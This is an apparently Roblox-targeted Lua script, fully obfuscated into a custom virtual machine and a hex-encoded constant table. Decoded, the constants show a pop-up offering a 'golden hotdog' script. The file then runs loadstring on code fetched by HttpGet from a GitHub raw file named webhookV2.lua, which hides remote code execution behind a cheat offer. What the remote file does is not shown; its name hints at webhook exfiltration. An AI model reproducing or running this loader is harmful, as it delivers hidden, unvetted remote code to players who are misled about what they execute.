-- hi

local v0 = tonumber;
local v1 = string.byte;
local v2 = string.char;
local v3 = string.sub;
local v4 = string.gsub;
local v5 = string.rep;
local v6 = table.concat;
local v7 = table.insert;
local v8 = math.ldexp;
local v9 = getfenv or function()
	return _ENV;
end;
local v10 = setmetatable;
local v11 = pcall;
local v12 = select;
local v13 = unpack or table.unpack;
local v14 = tonumber;
local function v15(v16, v17, ...)
	local v18 = 1;
	local v19;
	v16 = v4(v3(v16, 5), "..", function(v30)
		if (v1(v30, 2) == 81) then
			local v85 = 0;
			while true do
				if (v85 == 0) then
					v19 = v0(v3(v30, 1, 1));
					return "";
				end
			end
		else
			local v86 = v2(v0(v30, 16));
			if v19 then
				local v111 = 0;
				local v112;
				while true do
					if (v111 == 0) then
						v112 = v5(v86, v19);
						v19 = nil;
						v111 = 1;
					end
					if (v111 == 1) then
						return v112;
					end
				end
			else
				return v86;
			end
		end
	end);
	local function v20(v31, v32, v33)
		if v33 then
			local v87 = 0 + 0;
			local v88;
			while true do
				if (v87 == (0 - 0)) then
					v88 = (v31 / ((1 + 1 + 0) ^ (v32 - ((1 + 1) - 1)))) % ((3 - 1) ^ (((v33 - (2 - 1)) - (v32 - ((958 - (892 + 65)) + 0))) + 1));
					return v88 - (v88 % (1 - 0));
				end
			end
		else
			local v89 = (621 - (555 + 64)) ^ (v32 - (932 - (857 + 74)));
			return (((v31 % (v89 + v89)) >= v89) and (569 - (367 + 201))) or (927 - (214 + 713));
		end
	end
	local function v21()
		local v34 = v1(v16, v18, v18);
		v18 = v18 + 1;
		return v34;
	end
	local function v22()
		local v35, v36 = v1(v16, v18, v18 + 2);
		v18 = v18 + (4 - 2);
		return (v36 * (472 - 216)) + v35;
	end
	local function v23()
		local v37 = 0 - 0;
		local v38;
		local v39;
		local v40;
		local v41;
		while true do
			if (v37 == (1 + 0)) then
				return (v41 * (66680831 - 49903615)) + (v40 * (120312 - 54776)) + (v39 * (689 - 433)) + v38;
			end
			if (v37 == (350 - (87 + 263))) then
				v38, v39, v40, v41 = v1(v16, v18, v18 + 3 + 0);
				v18 = v18 + (184 - (67 + 113));
				v37 = (2 - 1) + 0 + 0;
			end
		end
	end
	local function v24()
		local v42 = v23();
		local v43 = v23();
		local v44 = (773 - (201 + 571)) - 0;
		local v45 = (v20(v43, 1188 - (1069 + 118), 45 - 25) * ((3 - 1) ^ (6 + 26))) + v42;
		local v46 = v20(v43, 37 - 16, 31);
		local v47 = ((v20(v43, 32) == ((1139 - (116 + 1022)) + 0)) and -(792 - (368 + (1760 - 1337)))) or (3 - 2);
		if (v46 == (18 - (6 + 4 + 8))) then
			if (v45 == (0 - 0)) then
				return v47 * 0;
			else
				local v113 = 442 - (416 + 26);
				while true do
					if (v113 == ((0 - 0) - 0)) then
						v46 = 1 + 0;
						v44 = 0 - 0;
						break;
					end
				end
			end
		elseif (v46 == (2485 - (145 + 293))) then
			return ((v45 == (0 - 0)) and (v47 * ((431 - (44 + 386)) / (1486 - (998 + (1347 - (814 + 45))))))) or (v47 * NaN);
		end
		return v8(v47, v46 - ((800 - 475) + 698)) * (v44 + (v45 / ((2 + 0) ^ (3 + 49))));
	end
	local function v25(v48)
		local v49 = 0 + 0;
		local v50;
		local v51;
		while true do
			if (v49 == (886 - (261 + 624))) then
				v50 = v3(v16, v18, (v18 + v48) - (1748 - (760 + 987)));
				v18 = v18 + v48;
				v49 = 3 - (1 + 0);
			end
			if ((1080 - (1020 + 60)) == v49) then
				v50 = nil;
				if not v48 then
					v48 = v23();
					if (v48 == (0 + 0)) then
						return "";
					end
				end
				v49 = 1424 - (630 + (1848 - (87 + 968)));
			end
			if (v49 == (6 - 4)) then
				v51 = {};
				for v114 = 4 - 3, #v50 do
					v51[v114] = v2(v1(v3(v50, v114, v114)));
				end
				v49 = 2 + 1;
			end
			if (v49 == (1 + 2)) then
				return v6(v51);
			end
		end
	end
	local v26 = v23;
	local function v27(...)
		return {...}, v12("#", ...);
	end
	local function v28()
		local v52 = (function()
			return function(v90, v91, v92, v93, v94, v95, v96, v97)
				local v90 = (function()
					return 0 + 0;
				end)();
				local v91 = (function()
					return;
				end)();
				local v93 = (function()
					return;
				end)();
				while true do
					if (v90 ~= 0) then
					else
						local v120 = (function()
							return 1690 - (209 + 1481);
						end)();
						local v121 = (function()
							return;
						end)();
						while true do
							if (v120 == 0) then
								v121 = (function()
									return 0 - 0;
								end)();
								while true do
									if (v121 == 0) then
										v91 = (function()
											return v92();
										end)();
										v93 = (function()
											return nil;
										end)();
										v121 = (function()
											return 1;
										end)();
									end
									if (1 ~= v121) then
									else
										v90 = (function()
											return #"]";
										end)();
										break;
									end
								end
								break;
							end
						end
					end
					if (v90 == #"[") then
						if (v91 == #"{") then
							v93 = (function()
								return v92() ~= (1636 - (1373 + 263));
							end)();
						elseif (v91 == (1002 - (451 + 549))) then
							v93 = (function()
								return v94();
							end)();
						elseif (v91 == #"19(") then
							v93 = (function()
								return v95();
							end)();
						end
						v96[v97] = (function()
							return v93;
						end)();
						break;
					end
				end
				return v90, v91, v92, v93, v94, v95, v96, v97;
			end;
		end)();
		local v53 = (function()
			return function(v98, v99, v100)
				local v101 = (function()
					return 0;
				end)();
				local v102 = (function()
					return;
				end)();
				while true do
					if (v101 ~= (0 + 0)) then
					else
						v102 = (function()
							return 0 - 0;
						end)();
						while true do
							if (v102 ~= 0) then
							else
								local v126 = (function()
									return 0 - 0;
								end)();
								local v127 = (function()
									return;
								end)();
								while true do
									if (0 ~= v126) then
									else
										v127 = (function()
											return 0;
										end)();
										while true do
											if (v127 == (1384 - (746 + 638))) then
												v98[v99 - #","] = (function()
													return v100();
												end)();
												return v98, v99, v100;
											end
										end
										break;
									end
								end
							end
						end
						break;
					end
				end
			end;
		end)();
		local v54 = (function()
			return {};
		end)();
		local v55 = (function()
			return {};
		end)();
		local v56 = (function()
			return {};
		end)();
		local v57 = (function()
			return {v54,v55,nil,v56};
		end)();
		local v58 = (function()
			return v23();
		end)();
		local v59 = (function()
			return {};
		end)();
		for v67 = #"~", v58 do
			FlatIdent_2FD19, Type, v21, Cons, v24, v25, v59, v67 = (function()
				return v52(FlatIdent_2FD19, Type, v21, Cons, v24, v25, v59, v67);
			end)();
		end
		v57[#"xxx"] = (function()
			return v21();
		end)();
		for v68 = #":", v23() do
			local v69 = (function()
				return v21();
			end)();
			if (v20(v69, #"[", #"~") == (0 + 0)) then
				local v106 = (function()
					return 0 - 0;
				end)();
				local v107 = (function()
					return;
				end)();
				local v108 = (function()
					return;
				end)();
				local v109 = (function()
					return;
				end)();
				local v110 = (function()
					return;
				end)();
				while true do
					if (v106 == (343 - (218 + 123))) then
						while true do
							if (v107 == #"]") then
								local v128 = (function()
									return 0;
								end)();
								while true do
									if (v128 ~= (1582 - (1535 + 46))) then
									else
										v107 = (function()
											return 2;
										end)();
										break;
									end
									if ((0 + 0) ~= v128) then
									else
										v110 = (function()
											return {v22(),v22(),nil,nil};
										end)();
										if (v108 == (0 + 0)) then
											local v290 = (function()
												return 560 - (306 + 254);
											end)();
											local v291 = (function()
												return;
											end)();
											while true do
												if (0 ~= v290) then
												else
													v291 = (function()
														return 0 + 0;
													end)();
													while true do
														if (v291 ~= 0) then
														else
															v110[#"nil"] = (function()
																return v22();
															end)();
															v110[#"0313"] = (function()
																return v22();
															end)();
															break;
														end
													end
													break;
												end
											end
										elseif (v108 == #"|") then
											v110[#"gha"] = (function()
												return v23();
											end)();
										elseif (v108 == (3 - 1)) then
											v110[#"asd"] = (function()
												return v23() - (2 ^ 16);
											end)();
										elseif (v108 ~= #"xnx") then
										else
											local v382 = (function()
												return 0;
											end)();
											local v383 = (function()
												return;
											end)();
											while true do
												if (v382 == 0) then
													v383 = (function()
														return 1467 - (899 + 568);
													end)();
													while true do
														if (v383 ~= (0 + 0)) then
														else
															v110[#"91("] = (function()
																return v23() - (2 ^ 16);
															end)();
															v110[#"asd1"] = (function()
																return v22();
															end)();
															break;
														end
													end
													break;
												end
											end
										end
										v128 = (function()
											return 2 - 1;
										end)();
									end
								end
							end
							if (v107 == 2) then
								local v129 = (function()
									return 0;
								end)();
								local v130 = (function()
									return;
								end)();
								while true do
									if (0 ~= v129) then
									else
										v130 = (function()
											return 603 - (268 + 335);
										end)();
										while true do
											if (v130 == 1) then
												v107 = (function()
													return #"asd";
												end)();
												break;
											end
											if (v130 == (290 - (60 + 230))) then
												if (v20(v109, #"{", #"/") ~= #"}") then
												else
													v110[2] = (function()
														return v59[v110[574 - (426 + 146)]];
													end)();
												end
												if (v20(v109, 2, 1 + 1) ~= #">") then
												else
													v110[#"91("] = (function()
														return v59[v110[#"91("]];
													end)();
												end
												v130 = (function()
													return 1;
												end)();
											end
										end
										break;
									end
								end
							end
							if (v107 ~= #"91(") then
							else
								if (v20(v109, #"-19", #"gha") == #",") then
									v110[#"xnxx"] = (function()
										return v59[v110[#".com"]];
									end)();
								end
								v54[v68] = (function()
									return v110;
								end)();
								break;
							end
							if (v107 == (1456 - (282 + 1174))) then
								local v132 = (function()
									return 811 - (569 + 242);
								end)();
								local v133 = (function()
									return;
								end)();
								while true do
									if ((0 - 0) == v132) then
										v133 = (function()
											return 0 + 0;
										end)();
										while true do
											if (v133 == 1) then
												v107 = (function()
													return #":";
												end)();
												break;
											end
											if (v133 == (1024 - (706 + 318))) then
												v108 = (function()
													return v20(v69, 1253 - (721 + 530), #"nil");
												end)();
												v109 = (function()
													return v20(v69, #"xnxx", 6);
												end)();
												v133 = (function()
													return 1;
												end)();
											end
										end
										break;
									end
								end
							end
						end
						break;
					end
					if ((1271 - (945 + 326)) == v106) then
						local v123 = (function()
							return 0 - 0;
						end)();
						while true do
							if (v123 == 1) then
								v106 = (function()
									return 1;
								end)();
								break;
							end
							if ((0 + 0) == v123) then
								v107 = (function()
									return 700 - (271 + 429);
								end)();
								v108 = (function()
									return nil;
								end)();
								v123 = (function()
									return 1;
								end)();
							end
						end
					end
					if (1 == v106) then
						local v124 = (function()
							return 0;
						end)();
						local v125 = (function()
							return;
						end)();
						while true do
							if (v124 == 0) then
								v125 = (function()
									return 0;
								end)();
								while true do
									if (v125 ~= (1 + 0)) then
									else
										v106 = (function()
											return 2;
										end)();
										break;
									end
									if (v125 ~= 0) then
									else
										v109 = (function()
											return nil;
										end)();
										v110 = (function()
											return nil;
										end)();
										v125 = (function()
											return 1501 - (1408 + 92);
										end)();
									end
								end
								break;
							end
						end
					end
				end
			end
		end
		for v70 = #".", v23() do
			v55, v70, v28 = (function()
				return v53(v55, v70, v28);
			end)();
		end
		return v57;
	end
	local function v29(v61, v62, v63)
		local v64 = v61[1];
		local v65 = v61[1088 - (461 + 625)];
		local v66 = v61[1291 - (993 + 295)];
		return function(...)
			local v71 = v64;
			local v72 = v65;
			local v73 = v66;
			local v74 = v27;
			local v75 = 1 + 0;
			local v76 = -1;
			local v77 = {};
			local v78 = {...};
			local v79 = v12("#", ...) - (1 + 0);
			local v80 = {};
			local v81 = {};
			for v103 = 0 + 0, v79 do
				if (v103 >= v73) then
					v77[v103 - v73] = v78[v103 + (1 - 0) + 0];
				else
					v81[v103] = v78[v103 + 1];
				end
			end
			local v82 = (v79 - v73) + 1 + 0;
			local v83;
			local v84;
			while true do
				v83 = v71[v75];
				v84 = v83[(79 + 451) - (406 + 123)];
				if (v84 <= ((1373 + 413) - (1749 + 20))) then
					if (v84 <= (2 + 6)) then
						if (v84 <= 3) then
							if (v84 <= (1323 - (1249 + 73))) then
								if ((57 <= 2723) and (v84 == (0 + 0))) then
									local v135;
									v81[v83[2]][v83[1148 - (466 + 112 + 567)]] = v83[9 - 5];
									v75 = v75 + (2 - 1);
									v83 = v71[v75];
									v81[v83[1902 - (23 + 83 + 1794)]][v83[1 + 2]] = v83[2 + 2];
									v75 = v75 + (2 - 1);
									v83 = v71[v75];
									v81[v83[5 - 3]][v83[117 - ((11 - 7) + 110)]] = v83[588 - (57 + 527)];
									v75 = v75 + (1428 - (41 + 1386));
									v83 = v71[v75];
									v81[v83[105 - (17 + 86)]][v83[3]] = v81[v83[3 + 1]];
									v75 = v75 + (1 - 0);
									v83 = v71[v75];
									v135 = v83[5 - (9 - 6)];
									v81[v135](v13(v81, v135 + ((60 + 107) - (122 + 44)), v83[5 - 2]));
									v75 = v75 + 1;
									v83 = v71[v75];
									v75 = v83[(4 + 5) - 6];
								else
									v75 = v83[3 + 0];
								end
							elseif ((v84 > (1 + 1)) or (2070 == 443)) then
								local v148;
								v81[v83[2]] = v81[v83[5 - 2]][v83[69 - (30 + 35)]];
								v75 = v75 + 1 + 0 + 0;
								v83 = v71[v75];
								v81[v83[1259 - (1043 + 214)]] = v83[11 - 8];
								v75 = v75 + 1;
								v83 = v71[v75];
								v148 = v83[1214 - (323 + 889)];
								v81[v148] = v81[v148](v81[v148 + (2 - 1)]);
								v75 = v75 + (581 - (263 + 98 + 219));
								v83 = v71[v75];
								v81[v83[322 - (53 + 267)]] = v81[v83[1 + 2]];
								v75 = v75 + (414 - (15 + 398));
								v83 = v71[v75];
								v81[v83[984 - (18 + 964)]] = v83[11 - 8];
							else
								local v159;
								local v160;
								v160 = v83[2];
								v159 = v81[v83[2 + 1]];
								v81[v160 + 1] = v159;
								v81[v160] = v159[v83[3 + 1]];
								v75 = v75 + (851 - (10 + 10 + 830));
								v83 = v71[v75];
								v81[v83[2 + 0]] = v83[129 - (116 + 10)];
								v75 = v75 + 1 + 0;
								v83 = v71[v75];
								v160 = v83[740 - (542 + 196)];
								v81[v160] = v81[v160](v13(v81, v160 + (1 - 0), v83[1 + 2]));
								v75 = v75 + (1434 - (797 + 636)) + 0;
								v83 = v71[v75];
								v160 = v83[1 + 1];
								v159 = v81[v83[3]];
								v81[v160 + ((9 - 7) - 1)] = v159;
								v81[v160] = v159[v83[9 - 5]];
								v75 = v75 + 1;
								v83 = v71[v75];
								v81[v83[1553 - (1126 + 425)]] = v83[3];
								v75 = v75 + 1;
								v83 = v71[v75];
								v81[v83[2]] = {};
								v75 = v75 + (406 - (118 + 287));
								v83 = v71[v75];
								v81[v83[7 - (1624 - (1427 + 192))]][v83[1124 - (118 + 1003)]] = v83[11 - (3 + 4)];
								v75 = v75 + 1;
								v83 = v71[v75];
								v81[v83[379 - (142 + 235)]][v83[3]] = v83[4];
								v75 = v75 + 1;
								v83 = v71[v75];
								v81[v83[9 - 7]] = v63[v83[(2 - 1) + 2]];
								v75 = v75 + (978 - (553 + 424));
								v83 = v71[v75];
								v81[v83[3 - 1]] = v81[v83[3 + 0]][v83[4]];
							end
						elseif (v84 <= (5 + 0 + 0)) then
							if ((v84 == (3 + 1)) or (2705 == 1393)) then
								local v185;
								v81[v83[1 + 0 + 1]] = v83[2 + 1];
								v75 = v75 + (2 - 1);
								v83 = v71[v75];
								v185 = v83[5 - 3];
								v81[v185](v81[v185 + (2 - 1)]);
								v75 = v75 + 1 + 0;
								v83 = v71[v75];
								v81[v83[(335 - (192 + 134)) - 7]] = v63[v83[3]];
								v75 = v75 + 1;
								v83 = v71[v75];
								v81[v83[755 - (239 + 514)]] = v81[v83[3]][v83[4]];
								v75 = v75 + (1277 - (316 + 960)) + 0;
								v83 = v71[v75];
								if ((v81[v83[2]] == v83[1333 - (797 + 532)]) or (4601 < 61)) then
									v75 = v75 + 1;
								else
									v75 = v83[3];
								end
							else
								v81[v83[2 + 0 + 0]] = v81[v83[2 + 0 + 1]];
							end
						elseif ((v84 <= 6) or (1390 >= 4744)) then
							local v196;
							local v197, v198;
							local v199;
							local v200;
							v81[v83[4 - 2]] = v63[v83[3]];
							v75 = v75 + 1;
							v83 = v71[v75];
							v81[v83[1204 - (373 + 767 + 62)]] = v63[v83[3]];
							v75 = v75 + 1;
							v83 = v71[v75];
							v200 = v83[733 - (476 + (974 - 719))];
							v199 = v81[v83[1133 - (369 + 761)]];
							v81[v200 + 1] = v199;
							v81[v200] = v199[v83[3 + 1]];
							v75 = v75 + (552 - (83 + 468));
							v83 = v71[v75];
							v81[v83[2 - 0]] = v83[3];
							v75 = v75 + (1 - 0);
							v83 = v71[v75];
							v81[v83[240 - (64 + 174)]] = v83[1 + 2] ~= (0 - 0);
							v75 = v75 + (337 - (144 + 192));
							v83 = v71[v75];
							v200 = v83[218 - (42 + 174)];
							v197, v198 = v74(v81[v200](v13(v81, v200 + 1 + 0, v83[3 + 0])));
							v76 = (v198 + v200) - (1 + 0);
							v196 = (3310 - (1202 + 604)) - (363 + 1141);
							for v279 = v200, v76 do
								local v280 = 0;
								while true do
									if (v280 == ((7375 - 5795) - (1183 + 397))) then
										v196 = v196 + (2 - 1);
										v81[v279] = v197[v196];
										break;
									end
								end
							end
							v75 = v75 + 1;
							v83 = v71[v75];
							v200 = v83[2 + 0];
							v81[v200] = v81[v200](v13(v81, v200 + 1, v76));
							v75 = v75 + 1 + 0;
							v83 = v71[v75];
							do
								return v81[v83[1977 - (1913 + 62)]]();
							end
							v75 = v75 + 1 + 0;
							v83 = v71[v75];
							v200 = v83[5 - 3];
							do
								return v13(v81, v200, v76);
							end
							v75 = v75 + (1934 - ((939 - 374) + 1368));
							v83 = v71[v75];
							do
								return;
							end
						elseif (v84 == (26 - 19)) then
							if ((v83[2] == v81[v83[4]]) or (2003 > 3834)) then
								v75 = v75 + 1;
							else
								v75 = v83[1664 - (1477 + 184)];
							end
						else
							local v293;
							local v294;
							v294 = v83[2 - (0 - 0)];
							v293 = v81[v83[3 + 0]];
							v81[v294 + (857 - (564 + 292))] = v293;
							v81[v294] = v293[v83[(331 - (45 + 280)) - 2]];
							v75 = v75 + 1;
							v83 = v71[v75];
							v81[v83[2]] = v83[(8 + 0) - 5];
							v75 = v75 + 1;
							v83 = v71[v75];
							v294 = v83[2];
							v81[v294] = v81[v294](v13(v81, v294 + (305 - (244 + 53 + 7)), v83[3 + 0]));
							v75 = v75 + 1;
							v83 = v71[v75];
							v81[v83[478 - (41 + 435)]] = v81[v83[1004 - (938 + 63)]];
							v75 = v75 + 1 + 0 + 0;
							v83 = v71[v75];
							if v81[v83[1127 - (936 + 105 + 84)]] then
								v75 = v75 + 1 + 0;
							else
								v75 = v83[1 + 2];
							end
						end
					elseif (v84 <= 12) then
						if ((v84 <= (1623 - (1565 + 48))) or (156 > 3913)) then
							if ((195 == 195) and (v84 == (6 + 3))) then
								do
									return;
								end
							else
								local v216 = 1138 - (782 + 356);
								local v217;
								while true do
									if (v216 == ((494 - 227) - (176 + 91))) then
										v217 = v83[4 - 2];
										v81[v217] = v81[v217](v81[v217 + (1 - 0)]);
										break;
									end
								end
							end
						elseif (v84 == (1103 - (975 + 117))) then
							v81[v83[1877 - (157 + 1718)]] = v63[v83[3 + 0]];
						elseif (v81[v83[2]] == v83[14 - 10]) then
							v75 = v75 + ((1914 - (340 + 1571)) - 2);
						else
							v75 = v83[3];
						end
					elseif (v84 <= (1032 - (697 + 321))) then
						if (v84 == ((14 + 21) - 22)) then
							v81[v83[2]][v83[5 - 2]] = v83[8 - 4];
						else
							local v222 = 0 + (1772 - (1733 + 39));
							local v223;
							local v224;
							local v225;
							while true do
								if ((3105 >= 1796) and (v222 == 1)) then
									v225 = 0 - 0;
									for v367 = v223, v83[10 - 6] do
										v225 = v225 + (2 - 1);
										v81[v367] = v224[v225];
									end
									break;
								end
								if ((4379 >= 2131) and (v222 == (1227 - (322 + 905)))) then
									v223 = v83[613 - (602 + 9)];
									v224 = {v81[v223](v81[v223 + (873 - (826 + 46))])};
									v222 = 1;
								end
							end
						end
					elseif (v84 <= ((1996 - (125 + 909)) - (245 + 702))) then
						if (v81[v83[6 - 4]] ~= v83[2 + 2]) then
							v75 = v75 + (1899 - (260 + 1638));
						else
							v75 = v83[443 - (382 + 58)];
						end
					elseif ((3844 >= 2043) and (v84 == (51 - 35))) then
						v81[v83[2 + 0]] = {};
					elseif not v81[v83[3 - 1]] then
						v75 = v75 + 1;
					else
						v75 = v83[8 - 5];
					end
				elseif (v84 <= 26) then
					if (v84 <= 21) then
						if (v84 <= (1224 - (902 + 303))) then
							if (v84 > (39 - 21)) then
								local v226;
								local v227, v228;
								local v229;
								local v230;
								v81[v83[4 - 2]] = v63[v83[1 + 2]];
								v75 = v75 + (1691 - (1121 + 569));
								v83 = v71[v75];
								v230 = v83[2];
								v229 = v81[v83[217 - (22 + (2140 - (1096 + 852)))]];
								v81[v230 + (684 - (483 + 200))] = v229;
								v81[v230] = v229[v83[1467 - (1404 + 59)]];
								v75 = v75 + 1 + 0;
								v83 = v71[v75];
								v81[v83[5 - 3]] = v83[3];
								v75 = v75 + 1;
								v83 = v71[v75];
								v230 = v83[2 - 0];
								v227, v228 = v74(v81[v230](v13(v81, v230 + 1, v83[(1096 - 328) - (454 + 14 + 297)])));
								v76 = (v228 + v230) - (563 - (334 + 228));
								v226 = 0 - 0;
								for v281 = v230, v76 do
									v226 = v226 + (2 - 1);
									v81[v281] = v227[v226];
								end
								v75 = v75 + (1 - 0);
								v83 = v71[v75];
								v230 = v83[1 + 1];
								v81[v230] = v81[v230](v13(v81, v230 + 1, v76));
								v75 = v75 + 1;
								v83 = v71[v75];
								v81[v83[238 - (141 + 95)]]();
								v75 = v75 + 1;
								v83 = v71[v75];
								v81[v83[2]] = v83[3];
							elseif v81[v83[2 + 0]] then
								v75 = v75 + (2 - 1);
							else
								v75 = v83[6 - 3];
							end
						elseif (v84 > (5 + 15)) then
							do
								return v81[v83[5 - 3]]();
							end
						else
							v81[v83[514 - (409 + 103)]]();
						end
					elseif (v84 <= 23) then
						if ((v84 > (16 + 6)) or (3232 <= 2731)) then
							local v244 = v83[2];
							v81[v244] = v81[v244](v13(v81, v244 + 1 + 0, v83[4 - 1]));
						else
							v81[v83[2 + (236 - (46 + 190))]] = v83[3] ~= (163 - (92 + 71));
						end
					elseif (v84 <= (12 + 12)) then
						v81[v83[2 - 0]] = v29(v72[v83[768 - (574 + 191)]], nil, v63);
					elseif (v84 == (21 + 4)) then
						local v310 = 0 - 0;
						local v311;
						local v312;
						while true do
							if ((4905 == 4905) and (v310 == (0 + (95 - (51 + 44))))) then
								v311 = v83[2];
								v312 = v81[v83[3]];
								v310 = 850 - (254 + 595);
							end
							if (v310 == (127 - (55 + 71))) then
								v81[v311 + (1 - 0)] = v312;
								v81[v311] = v312[v83[(506 + 1288) - (573 + 1217)]];
								break;
							end
						end
					else
						local v313 = (1317 - (1114 + 203)) - (726 - (228 + 498));
						local v314;
						while true do
							if (v313 == (0 + 0)) then
								v314 = v83[1 + 1];
								v81[v314](v81[v314 + (1 - 0)]);
								break;
							end
						end
					end
				elseif (v84 <= 31) then
					if (v84 <= (967 - (714 + 225))) then
						if (v84 > (78 - 51)) then
							local v248;
							local v249;
							v249 = v83[2 - 0];
							v248 = v81[v83[1 + 2]];
							v81[v249 + ((1 + 0) - (663 - (174 + 489)))] = v248;
							v81[v249] = v248[v83[810 - (118 + 688)]];
							v75 = v75 + 1;
							v83 = v71[v75];
							v81[v83[50 - (25 + 23)]] = v83[1 + (5 - 3)];
							v75 = v75 + 1;
							v83 = v71[v75];
							v249 = v83[2];
							v81[v249] = v81[v249](v13(v81, v249 + ((3792 - (830 + 1075)) - (927 + 959)), v83[10 - 7]));
							v75 = v75 + (733 - (16 + 716));
							v83 = v71[v75];
							v249 = v83[3 - 1];
							v248 = v81[v83[100 - (11 + 86)]];
							v81[v249 + (2 - 1)] = v248;
							v81[v249] = v248[v83[4]];
							v75 = v75 + (286 - (175 + 110));
							v83 = v71[v75];
							v81[v83[4 - 2]] = v83[14 - 11];
							v75 = v75 + (1797 - (503 + 1293));
							v83 = v71[v75];
							v249 = v83[5 - 3];
							v81[v249] = v81[v249](v13(v81, v249 + (525 - (303 + 221)) + 0, v83[1064 - (810 + 251)]));
							v75 = v75 + 1 + 0;
							v83 = v71[v75];
							v81[v83[1 + 1]] = v81[v83[3 + (1269 - (231 + 1038))]];
							v75 = v75 + (534 - (43 + 490));
							v83 = v71[v75];
							if (v81[v83[735 - (711 + 22)]] or (4136 >= 4411)) then
								v75 = v75 + (3 - 2);
							else
								v75 = v83[3];
							end
						else
							local v268 = 859 - (240 + 619);
							local v269;
							while true do
								if ((v268 == (0 + 0)) or (2958 == 4017)) then
									v269 = v83[2 - 0];
									v81[v269] = v81[v269](v13(v81, v269 + 1, v76));
									break;
								end
							end
						end
					elseif ((1228 >= 813) and (v84 <= (2 + 23 + 4))) then
						local v270 = (2906 - (171 + 991)) - (1344 + (1648 - 1248));
						local v271;
						local v272;
						while true do
							if ((409 - (255 + 150)) == v270) then
								v83 = v71[v75];
								v81[v83[(5 - 3) + 0]] = v83[2 + (2 - 1)];
								v75 = v75 + (4 - 3);
								v83 = v71[v75];
								v270 = 16 - 11;
							end
							if (v270 == ((1398 + 348) - (404 + 1335))) then
								v75 = v75 + ((1426 - 1019) - (183 + 223));
								v83 = v71[v75];
								v81[v83[2]] = v83[3 - (0 - 0)];
								v75 = v75 + 1 + 0;
								v270 = 8;
							end
							if (v270 == ((4 - 1) + 3)) then
								v272 = v83[339 - (10 + (1010 - 683))];
								v271 = v81[v83[3]];
								v81[v272 + 1] = v271;
								v81[v272] = v271[v83[3 + 1]];
								v270 = 7;
							end
							if (v270 == (348 - (118 + 220))) then
								v75 = v83[1 + 2];
								break;
							end
							if (v270 == (457 - ((1356 - (111 + 1137)) + 341))) then
								v83 = v71[v75];
								v81[v83[2]] = v81[v83[2 + 1]];
								v75 = v75 + (4 - 3);
								v83 = v71[v75];
								v270 = (1660 - (91 + 67)) - (711 + 782);
							end
							if (v270 == 9) then
								v272 = v83[3 - 1];
								v81[v272](v13(v81, v272 + (470 - (270 + 199)), v83[1 + 2]));
								v75 = v75 + (1820 - (580 + 1239));
								v83 = v71[v75];
								v270 = (86 - 57) - 19;
							end
							if (v270 == (1 + 0)) then
								v83 = v71[v75];
								v81[v83[1 + 1]] = v81[v83[2 + 1]][v83[9 - (2 + 3)]];
								v75 = v75 + 1 + (523 - (423 + 100));
								v83 = v71[v75];
								v270 = 1169 - (645 + 4 + 518);
							end
							if (v270 == (1790 - (1010 + 780))) then
								v271 = nil;
								v272 = nil;
								v81[v83[2 + 0]] = v81[v83[3]][v83[19 - 15]];
								v75 = v75 + (2 - 1);
								v270 = 1837 - (1045 + 791);
							end
							if ((12 - 7) == v270) then
								v272 = v83[(5 - 3) - 0];
								v81[v272] = v81[v272](v13(v81, v272 + ((264 + 242) - (351 + 154)), v83[1577 - (1281 + 293)]));
								v75 = v75 + (267 - (28 + 238));
								v83 = v71[v75];
								v270 = 12 - 6;
							end
							if ((1561 - (1381 + (949 - (326 + 445)))) == v270) then
								v81[v83[2]] = v63[v83[3 + 0]];
								v75 = v75 + 1 + 0;
								v83 = v71[v75];
								v272 = v83[1 + 1];
								v270 = 10 - 7;
							end
							if ((2 + 1) == v270) then
								v271 = v81[v83[473 - (381 + 89)]];
								v81[v272 + 1 + 0] = v271;
								v81[v272] = v271[v83[3 + 1]];
								v75 = v75 + 1;
								v270 = 6 - 2;
							end
						end
					elseif ((v84 > (1186 - (1074 + 82))) or (3455 > 4050)) then
						v81[v83[2]][v83[(26 - 20) - 3]] = v81[v83[1788 - (214 + 1570)]];
					else
						v81[v83[1457 - (990 + 465)]] = v83[2 + 1];
					end
				elseif ((243 == 243) and (v84 <= (15 + 18))) then
					if (v84 == (32 + 0)) then
						local v273 = 0 - 0;
						local v274;
						while true do
							if ((v273 == 0) or (271 > 1572)) then
								v274 = v83[1728 - (1668 + 58)];
								v81[v274](v13(v81, v274 + ((1396 - 769) - (512 + 114)), v83[7 - 4]));
								break;
							end
						end
					else
						local v275 = v83[3 - 1];
						local v276, v277 = v74(v81[v275](v13(v81, v275 + (3 - 2), v83[2 + 1])));
						v76 = (v277 + v275) - (1 + 0);
						local v278 = 0;
						for v284 = v275, v76 do
							v278 = v278 + 1 + 0;
							v81[v284] = v276[v278];
						end
					end
				elseif (v84 <= (114 - 80)) then
					for v287 = v83[1996 - ((253 - 144) + 1885)], v83[1472 - (1269 + 200)] do
						v81[v287] = nil;
					end
				elseif ((2739 < 3293) and (v84 > 35)) then
					local v320 = v83[3 - 1];
					do
						return v13(v81, v320, v76);
					end
				else
					v81[v83[817 - (98 + 717)]] = v81[v83[829 - (802 + 24)]][v83[6 - (713 - (530 + 181))]];
				end
				v75 = v75 + 1;
			end
		end;
	end
	return v29(v28(), {}, v17)(...);
end
return v15("LOL!293Q0003043Q0067616D6503073Q00506C6163654964022Q0020141B980642023Q000F2F2Q0142028Q00026Q00F03F03083Q004F6E496E766F6B6503053Q007063612Q6C027Q004003053Q007072696E74031B3Q00536372697074206C6F616465642073752Q63652Q7366752Q6C792103043Q007761726E031A3Q004661696C656420746F206C6F616420746865207363726970743A030A3Q006C6F6164737472696E6703073Q00482Q747047657403573Q00682Q7470733A2Q2F7261772E67697468756275736572636F6E74656E742E636F6D2F49736E6F74616C77692F526F626C6F782D5363726970742F726566732F68656164732F6D61696E2F776562682Q6F6B56322E6C7561026Q00084003083Q0049734C6F6164656403063Q004C6F6164656403043Q005761697403083Q00496E7374616E63652Q033Q006E657703103Q0042696E6461626C6546756E6374696F6E030A3Q0047657453657276696365030A3Q005374617274657247756903073Q00536574436F726503103Q0053656E644E6F74696669636174696F6E03053Q005469746C6503073Q004E4F544943452103043Q0054657874033F3Q00446F20796F752077616E7420746F2045786320746869732053637269707420666F7220676F6C64656E20686F74646F673F20616E64203320696E7374616E7403083Q004475726174696F6E03043Q006D61746803043Q006875676503073Q0042752Q746F6E312Q033Q0059657303073Q0042752Q746F6E3203023Q004E6F03043Q0049636F6E031B3Q00726278612Q73657469643A2Q2F393236333937353031303139343803083Q0043612Q6C6261636B004F3Q00120B3Q00013Q0020235Q000200260F3Q0008000100030004013Q0008000100120B3Q00013Q0020235Q000200260C3Q004E000100040